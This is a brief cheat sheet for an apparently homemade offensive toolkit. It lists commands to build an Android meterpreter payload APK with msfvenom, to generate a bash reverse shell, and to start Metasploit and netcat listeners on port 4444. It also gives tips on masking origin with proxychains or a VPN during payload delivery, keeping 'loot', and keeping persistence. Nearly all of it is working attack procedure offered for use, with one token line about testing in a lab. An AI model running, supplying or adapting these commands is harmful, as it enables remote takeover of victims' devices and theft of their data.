🐉 Kydras Payload Quickstart Cheat Sheet 🐉

✅ Android Payload (msfvenom):
bash ~/Kydras-Payloads/payloads/android-payload-lite.sh
# Output saved to ~/Kydras_Loot/payloads/android_kydras_payload.apk

✅ Simple Reverse Shell (bash one-liner):
bash ~/Kydras-Payloads/payloads/simple-reverse-shell.sh
# Output saved to ~/Kydras_Loot/payloads/reverse-shell.txt

✅ Recommended Metasploit Listener:
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST your_ip; set LPORT 4444; exploit"

✅ Netcat Listener (Linux reverse shell):
nc -lvnp 4444

✅ Pro Tips:
- Always test payloads in a safe, isolated lab.
- Use proxychains or VPN during payload delivery.
- Store all payloads and outputs in ~/Kydras_Loot/payloads/
- For persistence, use Termux session backups and screen/tmux.
